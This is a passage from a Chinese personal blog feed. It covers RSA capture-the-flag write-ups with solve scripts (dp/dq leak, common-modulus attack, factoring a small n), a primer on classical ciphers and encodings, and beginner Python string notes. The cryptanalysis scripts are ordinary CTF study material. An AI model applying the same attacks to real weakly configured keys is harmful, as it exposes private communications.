class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span> </span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span> </span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span> </span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line">decrypt(dp,dq,p,q,c)</span><br></pre></td></tr></table></figure><p>结果得到：<br><img src="https://img-blog.csdnimg.cn/2020042218574870.png" alt="Augenstern" loading="lazy"></p><h2 id="RSA2"><a href="#RSA2" class="headerlink" title="RSA2"></a>RSA2</h2><p><img src="https://img-blog.csdnimg.cn/20200422191857834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>知道dp，n，e;求明文m.，我还是不会写脚本，现在才发现我这篇博客就是用来收集脚本的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = gp.mpz(<span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span>)</span><br><span class="line">dp = gp.mpz(<span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span>)</span><br><span class="line"></span><br><span class="line">c = gp.mpz(<span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, e):</span><br><span class="line">    <span class="keyword">if</span>(e*dp%x==<span class="number">1</span>):</span><br><span class="line">        p=(e*dp<span class="number">-1</span>)//x+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(n%p!=<span class="number">0</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        q=n//p</span><br><span class="line">        phin=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">        d=gp.invert(e, phin)</span><br><span class="line">        m=gp.powmod(c, d, n)</span><br><span class="line">        <span class="keyword">if</span>(len(hex(m)[<span class="number">2</span>:])%<span class="number">2</span>==<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        print(<span class="string">&#x27;--------------&#x27;</span>)</span><br><span class="line">        print(m)</span><br><span class="line">        print(hex(m)[<span class="number">2</span>:])</span><br><span class="line">        print(bytes.fromhex(hex(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果：<br><img src="https://img-blog.csdnimg.cn/2020042220082310.png" alt="Augenstern" loading="lazy"></p><h2 id="RSA3"><a href="#RSA3" class="headerlink" title="RSA3"></a>RSA3</h2><p><img src="https://img-blog.csdnimg.cn/20200422200908902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>已知c1、c2、e1、e1、n 的情况</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n=<span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line">e1=<span class="number">11187289</span></span><br><span class="line">e2=<span class="number">9647291</span></span><br><span class="line">s = gcdext(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = -s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">c1=<span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line">c2=<span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line">e2=<span class="number">9647291</span></span><br><span class="line">c2 = invert(c2, n)</span><br><span class="line">m = (pow(c1,s1,n) * pow(c2 , s2 , n)) % n</span><br><span class="line"><span class="keyword">print</span> (m)</span><br><span class="line"><span class="keyword">print</span> (libnum.n2s(m))</span><br></pre></td></tr></table></figure><p>结果：<br><img src="https://img-blog.csdnimg.cn/20200422215606943.png" alt="Augenstern" loading="lazy"></p><h2 id="RSA-1"><a href="#RSA-1" class="headerlink" title="RSA"></a>RSA</h2><p><img src="https://img-blog.csdnimg.cn/2020042221563079.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>打开压缩包，是两个文件<br><img src="https://img-blog.csdnimg.cn/20200422215723514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>打开这个文件(txt打开或者notepad++)<br>发现了公钥<br><img src="https://img-blog.csdnimg.cn/20200422215858649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>在线解析公钥的网站直接解析出我们需要的信息<a href="https://www.ssleye.com/pub_asysi.html">在线解析公钥</a><br><img src="https://img-blog.csdnimg.cn/20200422215956515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>得到n和e<br>分解n得到p和q  ,可以使用yafu因数分解大数<br><img src="https://img-blog.csdnimg.cn/20200422221039998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>也可以在线网站分解，这个还不算大数，如果特别大的数还是yafu 比较好用啦。<br><img src="https://img-blog.csdnimg.cn/20200422220618503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>最后都能得出结果来<br>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line">p = <span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">q = <span class="number">304008741604601924494328155975272418463</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,(q<span class="number">-1</span>)*(p<span class="number">-1</span>))</span><br><span class="line">print(d)</span><br><span class="line"></span><br><span class="line">d = <span class="number">81176168860169991027846870170527607562179635470395365333547868786951080991441</span></span><br><span class="line"></span><br><span class="line">key = rsa.PrivateKey(n,e,d,p,q)</span><br><span class="line">print(key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;flag.enc&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">print(rsa.decrypt(f.read(),key).decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20200422231252274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>过程中遇到的错误：<br>原本我是在pycharm里跑脚本，但是跑这个脚本的时候 报错了。报错信息是这样的。<br><code>AttributeError: module &#39;rsa&#39; has no attribute &#39;PrivateKey&#39;</code><br><img src="https://img-blog.csdnimg.cn/20200422232637417.png" alt="Augenstern" loading="lazy"><br>这种报错毫无头绪，百度找不到类似的错误，然后我怀疑脚本的问题，然后又找找其他的脚本，但是发现报错信息差不多，都是这个地方。想起来我电脑上还安装了ipython，于是就试试，但是也跑不出来。就去问了问学长。学长说在kali里面试试。这个我还没试，因为那里面还没安装gmpy2这个库。明天再安装。这期间我发现错误就是路径的问题。倒数第二行代码，打开文件<code>flag.enc</code>这个文件，要添加路径，路径中原本的<code>\</code>在这里使用<code>\\</code>因为转义。我于是又在pycharm里跑了一次，但是没有结果，同样的错误。<br><strong>重点</strong>：我在ipython中试了一下，结果惊喜来了，成功了。就得到了上面的运行结果。<br>回头kali安装好gmpy2这个库之后我再试试这个题。<br>我还以为这篇博客真的要成为一篇纯粹收集脚本的文章了呢。还是有自己的收获的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rot13+base+md5等密码的基本了解</title>
      <link href="/2020/08/23/rot13+base+md5%E7%AD%89%E5%AF%86%E7%A0%81%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BA%86%E8%A7%A3/"/>
      <url>/2020/08/23/rot13+base+md5%E7%AD%89%E5%AF%86%E7%A0%81%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BA%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="rot13密码"><a href="#rot13密码" class="headerlink" title="rot13密码"></a>rot13密码</h1><p>套用ROT13到一段文字上仅仅只需要检查字元字母顺序并取代它在13位之后的对应字母，有需要超过时则重新绕回26英文字母开头即可。A换成N、B换成O、依此类推到M换成Z，然后序列反转：N换成A、O换成B、最后Z换成M。只有这些出现在英文字母里头的字元受影响；数字、符号、空白字元以及所有其他字元都不变。不过它好像凯撒密码的变形版，凯撒密码是将明文的字母向后移动三位的到密文：<br><img src="https://img-blog.csdnimg.cn/20200211135337793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>凯撒密码解密就是把密文在字母表中把各个字母向前移动三位，凯撒密码还可以变形有时候并不见得就是三位，可能是四位，八位……都有可能，而rot13就是移动13位，密文变回明文的话就再进行一次rot13加密就行了，因为13*2=26。<br>rot13比较常用，当然还有其它的rot密码，rot5,rot18……自行百度就行了，hhh</p><h1 id="base密码"><a href="#base密码" class="headerlink" title="base密码"></a>base密码</h1><p>base密码有base16,base32 ,base64。（听说还有base8，不过常用的应该是那三种。/）因为现在加密解密在百度上有大量的在线加密解密软件，所以我们只要见了能认出来就行，不用太深度探究。毕竟电脑计算要比普通人计算要快的多。<br><strong>1.base16</strong><br>特征：Base16编码就是将ASCII字符集中可打印的字符(数字0—9和字母A—F)对应的二进制字节数据进行编码<br><strong>2.base32</strong><br>特征：与Base16编码区别的是,Base32使用了ASCII编码中可打印的32个字符(大写字母A—Z和数字2~7)对任意字节数据进行编码.<br><strong>3.base64</strong><br>特征：Base64编码使用了ASCII编码中64个可打印的字符(大写字母A—Z,小写字母a—z,数字0—9以及”+”,”/“)将任意字节数据进行编码，还有“=”也是base64的一个标志。</p><h1 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h1><p>MD5密码的特征：16位或32位字母加数字组成的一段密文，字母大小统一。</p><h1 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h1><p>栅栏密码就是将要加密的明文分成N个一组，然后把每组的第i个字连起来，形成一段无规律的话。一般比较常见的是2栏的棚栏密码。但有些人不这样，他可能会设置3栏、4栏一组的。解密时可能要多尝试几次。<br>棚栏密码本身有一个潜规则，就是组成棚栏的字母一般不会太多。（一般不超过30个，也就是一、两句话）</p><h1 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h1><p>如果你看到一串字符里全是A和B，并且5个一组的时候，就是培根加密。培根加密只能加密字母。</p><h1 id="摩斯密码"><a href="#摩斯密码" class="headerlink" title="摩斯密码"></a>摩斯密码</h1><p>摩斯密码太耳熟了，小时候看电视剧，有些电视剧会有这些情节，而摩斯密码一般出现形式为 “.”和“-”或者为0和1。有时候也用音调的长短来加密。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python入坑学习笔记(3)</title>
      <link href="/2020/08/23/Python%E5%85%A5%E5%9D%91%E4%B9%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2020/08/23/Python%E5%85%A5%E5%9D%91%E4%B9%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>前言：这次继续学python：<br>==1.元组（与列表很像，但又不是列表。奇奇怪怪）==<br>==2.字符串==<br>==3.序列==</p><h2 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h2><h5 id="创建和访问一个元组"><a href="#创建和访问一个元组" class="headerlink" title="创建和访问一个元组"></a>创建和访问一个元组</h5><p><code>tuple</code>连老规矩我都懒得说了。往下瞅</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>tuple = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tuple</span><br><span class="line">(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(tuple)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>元组呢，跟列表不同的地方就在列表是用中括号的，而元组则是用小括号的，当然这不是重点。<strong>重点是：列表可以随意更改、删除、添加列表里的元素；而元组就不能更改元组里的元素。</strong><br><img src="https://img-blog.csdnimg.cn/20200223210855543.png" alt="在这里插入图片描述" loading="lazy"><br>我一改，他就报错了。不让改。<br><img src="https://img-blog.csdnimg.cn/20200223211542372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>对比这三个，为什么<code>temp = (1)</code>带了括号不是元组，而temp1不带小括号却是元组？ 因为：<strong>是不是元组取决于那个==逗号==而不是括号</strong>，再看第三个例子就明白了。<br>为什么说元组跟列表很像呢？？？因为元组也可以进行与列表相似的操作<br><img src="https://img-blog.csdnimg.cn/20200223212610674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这些操作与列表很像吧！！！</p><h5 id="更新和删除一个元组"><a href="#更新和删除一个元组" class="headerlink" title="更新和删除一个元组"></a><strong>更新和删除一个元组</strong></h5><p>不是说了，不能更改元组里的东西吗？？为什么还能更新？？？？这里可以用效仿更新字符串的方法，先切片，把字符串切成两部分再插入新的元素。对文字不太敏感看例子。没有什么是一个例子解决不了的。<br><img src="https://img-blog.csdnimg.cn/20200223215310460.png" alt="在这里插入图片描述" loading="lazy"><br>新的元组被创造出来（就是插入过元素后的元组）旧的元组就会被删掉，系统嫌它浪费资源，哈哈哈！！<br>插入时，注意<strong>括号和逗号</strong>不能丢，否则，，，否则怎样可以自己试试😎😎😎<br>删除呢就很简单，用del语句就行<br><img src="https://img-blog.csdnimg.cn/20200223215812330.png" alt="在这里插入图片描述" loading="lazy"><br>删除后再查看一下，不存在了，证明已经删除掉了。</p><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>首先，字符串跟元组差不多，也不能随意更改，真要改就用切片法。定义就不废话了，<br>提取字符串里的字符，str[想要提取的字符的数字]，比如：str[5]<br>直接在字符串中插入字符串，用算数运算符“+”来插入，就像连接两个字符串一样。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>str1 = <span class="string">&#x27;I love flag&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str1[:<span class="number">6</span>]</span><br><span class="line"><span class="string">&#x27;I love&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str1[<span class="number">5</span>]</span><br><span class="line"><span class="string">&#x27;e&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str1[:<span class="number">6</span>] + <span class="string">&#x27; 简单的&#x27;</span> + str1[<span class="number">6</span>:]</span><br><span class="line"><span class="string">&#x27;I love 简单的 flag&#x27;</span></span><br></pre></td></tr></table></figure><p>但是，再输入str1，<br><img src="https://img-blog.csdnimg.cn/2020030114484340.png" alt="在这里插入图片描述" loading="lazy"><br>还是老样子，没有变。难道真没法改？？<br>那再试试。<br><img src="https://img-blog.csdnimg.cn/20200301144948858.png" alt="在这里插入图片描述" loading="lazy"><br>这样就可以啦。</p><h4 id="字符串的各种内置方法（一小部分）："><a href="#字符串的各种内置方法（一小部分）：" class="headerlink" title="字符串的各种内置方法（一小部分）："></a>字符串的各种内置方法（一小部分）：</h4><p>1.连接方法，上面就是，不在多说，<br>内置函数<code>len()</code>返回对象（字符串、列表、元组等）长度或项目个数。用法如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = <span class="string">&#x27;hello,world!&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(x)</span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure><p>2.<code>strip()</code>strip英文翻译：脱掉，剥夺<br>strip()默认移除字符串两边的空白。只是返回处理后的副本，原来的值不变。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>str = <span class="string">&#x27;    fuck     &#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str</span><br><span class="line"><span class="string">&#x27;    fuck     &#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str.strip()</span><br><span class="line"><span class="string">&#x27;fuck&#x27;</span></span><br></pre></td></tr></table></figure><p>默认去除空白，但这个函数是有一个参数的，还可以这样用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>str1 = <span class="string">&#x27;666666dage6666666&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str1</span><br><span class="line"><span class="string">&#x27;666666dage6666666&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str1.strip(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;dage&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str2 = <span class="string">&#x27;$$$$$$$大哥$$$$$$$$&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str2</span><br><span class="line"><span class="string">&#x27;$$$$$$$大哥$$$$$$$$&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str2.strip(<span class="string">&#x27;$&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;大哥&#x27;</span></span><br></pre></td></tr></table></figure><p>跟它一样的使用还有两个<code>lstrip()</code>和<code>rstrip()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>str2.lstrip(<span class="string">&#x27;$&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;大哥$$$$$$$$&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str2.rstrip(<span class="string">&#x27;$&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;$$$$$$$大哥&#x27;</span></span><br></pre></td></tr></table></figure><p>相信聪明的你已经看出来了<br>3.<code>capitalize()</code>返回首字母大写的副本，不改变原来的值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj = <span class="string">&#x27;hello,world&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.capitalize()</span><br><span class="line"><span class="string">&#x27;Hello,world&#x27;</span></span><br></pre></td></tr></table></figure><p>4.<code>title()</code>返回标题样式的副本(单词首字母大写),不改变原来的值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj=<span class="string">&#x27;hello,world&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.title()</span><br><span class="line"><span class="string">&#x27;Hello,World&#x27;</span></span><br></pre></td></tr></table></figure><p>5.<code>upper()</code>返回所有字母大写的副本，不改变原来的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj=<span class="string">&#x27;hello,world&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.upper()</span><br><span class="line"><span class="string">&#x27;HELLO,WORLD&#x27;</span></span><br></pre></td></tr></table></figure><p>6.lower()返回所有字母小写的副本，不改变原来的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj=<span class="string">&#x27;Hello,World&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.lower()</span><br><span class="line"><span class="string">&#x27;hello,world&#x27;</span></span><br></pre></td></tr></table></figure><p>7.<code>center()</code>返回一个原字符串居中,并使用空格填充至长度 width 的新字符串。默认填充字符为空格。居中显示<br>语法:<br>str.center(width[,fillchar])<br>width——字符串的总宽度<br>fillchar—–填充字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj=<span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.center(<span class="number">15</span>,<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;@@@@@hello@@@@@&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj = <span class="string">&#x27;dage&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.center(<span class="number">16</span>,<span class="string">&#x27;$&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;$$$$$$dage$$$$$$&#x27;</span></span><br></pre></td></tr></table></figure><p>8.<code>count()</code>方法用于统计字符串里某个字符出现的次数。可选参数为在字符串搜索的开始与结束位置。空格也是字符。<br>语法：<br>str.count(canshu,start,end)<br>canshu—–搜索的子字符串<br>start—-字符串开始搜索的位置，默认为第一个字符，第一个字符索引值为0<br>end—–字符串中结束搜索的位置。默认为字符串的最后一个位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj = <span class="string">&#x27;hello,the greatwall&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.count(<span class="string">&#x27;l&#x27;</span>,<span class="number">1</span>,<span class="number">10</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.count(<span class="string">&#x27;l&#x27;</span>)</span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure><p>9.<code>endswith()</code> 方法用于判断字符串是否以指定后缀结尾，如果以指定后缀结尾返回True，否则返回False。可选参数”start”与”end”为检索字符串的开始与结束位置。<br>语法:<br><code>str.endswith(canshu,start,end)</code><br>canshu—-该参数可以是一个字符串或者是一个元素<br>start—-字符串开始的位置<br>end——字符中结束的位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj = <span class="string">&#x27;$wkx$syf&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.endswith(<span 